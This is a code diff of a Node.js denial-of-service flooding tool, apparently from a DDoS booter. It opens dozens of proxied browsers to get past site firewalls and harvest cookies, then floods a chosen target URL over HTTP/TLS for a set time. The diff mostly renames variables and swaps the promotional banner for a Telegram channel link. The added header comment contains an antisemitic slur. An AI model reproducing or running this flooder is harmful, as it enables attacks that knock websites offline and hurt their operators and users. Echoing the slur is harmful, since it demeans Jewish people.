@@ -1,8 +1,6 @@
-/*
-
-** @ImComplex **
-
-*/
+/**
+ * to the dev of the script: WHO THE FUCK MADE THIS PLEASE PLEASE PLEASE LEARN JS I'M GETTING FUCKING JEW CANCER
+ */
 
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 (ignoreNames = [
@@ -61,35 +59,35 @@ const { exec } = require("child_process");
 const colors = require("colors");
 const url = require("url");
 const syncRequest = require("sync-request");
-var CustomsARGVS = require("minimist")(process.argv.slice(2));
+var arguments = require("minimist")(process.argv.slice(2));
 const fs = require("fs");
 let target = process.argv[2].split('""')[0];
 const time = process.argv[3];
 var parsed = url.parse(target);
 var host = url.parse(target).host;
 
-let length_browsers = 70;
-let browser_saves = "";
+let totalBrowsers = 70;
+let browserSaves = "";
 let user_agent = "";
-let ModeATTACK = CustomsARGVS.mode;
-let PostaMOD = undefined;
+let attackMode = arguments.mode;
+let postaMod = undefined;
 let rff = undefined;
-let cookie_CTM = undefined;
-let connections = CustomsARGVS.conn;
-let ListIDS = [];
+let cookieCtm = undefined;
+let connections = arguments.conn;
+let listIds = [];
 let Idbrw = 0;
 let idsRunned = [];
-if (CustomsARGVS.postdata) {
-  if (CustomsARGVS.postdata.includes("~")) {
-    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/~/g, "&");
+if (arguments.postdata) {
+  if (arguments.postdata.includes("~")) {
+    arguments.postdata = arguments.postdata.replace(/~/g, "&");
   }
-  if (CustomsARGVS.postdata.includes("*")) {
-    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/\*/g, "%");
+  if (arguments.postdata.includes("*")) {
+    arguments.postdata = arguments.postdata.replace(/\*/g, "%");
   }
 }
-if (CustomsARGVS.customCookie) {
-  if (CustomsARGVS.customCookie.includes("~")) {
-    CustomsARGVS.customCookie = CustomsARGVS.customCookie.replace(/~/g, ";");
+if (arguments.customCookie) {
+  if (arguments.customCookie.includes("~")) {
+    arguments.customCookie = arguments.customCookie.replace(/~/g, ";");
   }
 }
 if (target.includes("*")) {
@@ -97,10 +95,9 @@ if (target.includes("*")) {
 }
 
 let typeAlert = 2;
-let PROMOTION = "Booter.sx got fucking rekt";
+let PROMOTION = "Updated by https://t.me/ackflood";
 
-//proxy selection
-var PROXYURL = `http://yourproxies/premium1.txt`;
+var proxyURL = `http://yourproxies/premium1.txt`;
 var VarsDefinetions = {
   Objetive: target,
   VersionsHTTP: ["HTTP/1.1", "HTTP/1.2", "HTTP/1.3"],
@@ -123,12 +120,12 @@ function log(string) {
   console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
 }
 
-log(`HelixJS (v2) ` + `[ ${PROMOTION} ]`);
+log(`Shit Method (v2) ` + `[ ${PROMOTION} ]`);
 log(`Loading proxies..`);
 
 try {
-  if (PROXYURL.indexOf("//") & PROXYURL.indexOf(".")) {
-    var res = syncRequest("GET", PROXYURL, {
+  if (proxyURL.indexOf("//") & proxyURL.indexOf(".")) {
+    var res = syncRequest("GET", proxyURL, {
       headers: {
         "user-agent":
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
@@ -149,14 +146,14 @@ function ProxyGenerate() {
 
 function brow_tokens(strings, proxy_co, ua_received) {
   if (
-    browser_saves == null &&
-    browser_saves == undefined &&
-    browser_saves == ""
+    browserSaves == null &&
+    browserSaves == undefined &&
+    browserSaves == ""
   ) {
-    browser_saves +=
+    browserSaves +=
       "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
   } else {
-    browser_saves +=
+    browserSaves +=
       "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
   }
 }
@@ -182,7 +179,7 @@ var launch_browser = async function launch_browser(Extra = {}) {
         "]" +
         ` Unknown error occured while trying to bypass firewall with ip: ${Proxy}`
     );
-    ListIDS.push(IdBrowser);
+    listIds.push(IdBrowser);
     return;
   } else if (resposense == "error") {
     log(
@@ -191,11 +188,11 @@ var launch_browser = async function launch_browser(Extra = {}) {
         "]" +
         ` Error while trying to bypass firewall with ip: ${Proxy}`
     );
-    ListIDS.push(IdBrowser);
+    listIds.push(IdBrowser);
     return;
   } else {
     if (typeAlert == 1) {
-      log(`Browsers received (${browser_saves.split("#").length})`);
+      log(`Browsers received (${browserSaves.split("#").length})`);
     } else if (typeAlert == 2) {
       log(
         `[info]` +
@@ -213,26 +210,26 @@ var launch_browser = async function launch_browser(Extra = {}) {
       resposense[IdBrowser].split(":::")[0],
       resposense[IdBrowser].split(":::")[1]
     );
-    ListIDS.push(IdBrowser);
+    listIds.push(IdBrowser);
   }
 };
 
-if (ModeATTACK == "browser") {
-  log(`Mode: ` + `${ModeATTACK.toUpperCase()}`);
-  log(`Total browsers to open: ` + `${length_browsers}`);
+if (attackMode == "browser") {
+  log(`Mode: ` + `${attackMode.toUpperCase()}`);
+  log(`Total browsers to open: ` + `${totalBrowsers}`);
   log(`method: ` + `${VarsDefinetions.Method_raw}`);
-  log(`postdata: ` + `${CustomsARGVS.postdata || "false"}`);
-  log(`cookie: ` + `${CustomsARGVS.customCookie || "false"}`);
-  log(`referer: ` + `${CustomsARGVS.referer || "false"}`);
+  log(`postdata: ` + `${arguments.postdata || "false"}`);
+  log(`cookie: ` + `${arguments.customCookie || "false"}`);
+  log(`referer: ` + `${arguments.referer || "false"}`);
   log(`Launching browsers on: ` + `${target}`);
   let NumOPenBrowser = 10;
   var myInterval = setInterval(function () {
     //idsRunned: lista de ids ya lanzados
-    if (ListIDS.length >= length_browsers) {
+    if (listIds.length >= totalBrowsers) {
       //KillBrowsers();
       clearInterval(myInterval);
       log(`[success]` + ` Attcak proccess finished, idle set.`);
-    } else if (ListIDS.length == idsRunned.length) {
+    } else if (listIds.length == idsRunned.length) {
       for (let j = 0; j < NumOPenBrowser; j++) {
         const Proxy = ProxyGenerate();
         idsRunned.push(Idbrw);
@@ -241,14 +238,14 @@ if (ModeATTACK == "browser") {
 
       log(`[info] Starting interval`);
     } else if (
-      ListIDS.length == length_browsers &&
-      ListIDS.length < (50 / 100) * length_browsers
+      listIds.length == totalBrowsers &&
+      listIds.length < (50 / 100) * totalBrowsers
     ) {
       log(`[success] Cookies recolected!`);
     }
   }, 0);
-} else if (ModeATTACK == "tls") {
-  log(`[info] Mode: ${ModeATTACK}`);
+} else if (attackMode == "tls") {
+  log(`[info] Mode: ${attackMode}`);
   log(`Target: ${target}`);
   require("./browser/flooder").TLSHTTP(
     (option = {
@@ -266,28 +263,28 @@ if (ModeATTACK == "browser") {
 }
 
 function setFlooder(ip, cookie, ua) {
-  if (CustomsARGVS.postdata) {
-    PostaMOD = encodeURI(CustomsARGVS.postdata);
+  if (arguments.postdata) {
+    postaMod = encodeURI(arguments.postdata);
   }
 
   try {
     if (
-      (CustomsARGVS.referer.includes("//") == true) &
-        (CustomsARGVS.referer.includes(".") == true) &&
-      CustomsARGVS.referer.includes("//") == true
+      (arguments.referer.includes("//") == true) &
+        (arguments.referer.includes(".") == true) &&
+      arguments.referer.includes("//") == true
     ) {
-      rff = CustomsARGVS.referer;
+      rff = arguments.referer;
     }
   } catch (error) {
     rff = target;
   }
 
   try {
-    if (CustomsARGVS.customCookie.includes("=") == true) {
-      cookie_CTM = ";" + CustomsARGVS.customCookie;
+    if (arguments.customCookie.includes("=") == true) {
+      cookieCtm = ";" + arguments.customCookie;
     }
   } catch (error) {
-    cookie_CTM = "";
+    cookieCtm = "";
   }
 
   require("./browser/flooder.js").flooderTLS(
@@ -300,10 +297,10 @@ function setFlooder(ip, cookie, ua) {
       target: VarsDefinetions.Objetive,
       RequestIP: VarsDefinetions.req_ip,
       userAgent: user_agent,
-      addcookie: cookie_CTM,
+      addcookie: cookieCtm,
       TimeATTACK: VarsDefinetions.time,
       METHOD: VarsDefinetions.Method_raw,
-      PostData: PostaMOD || undefined,
+      PostData: postaMod || undefined,
       connections: connections || 32,
     })
   );
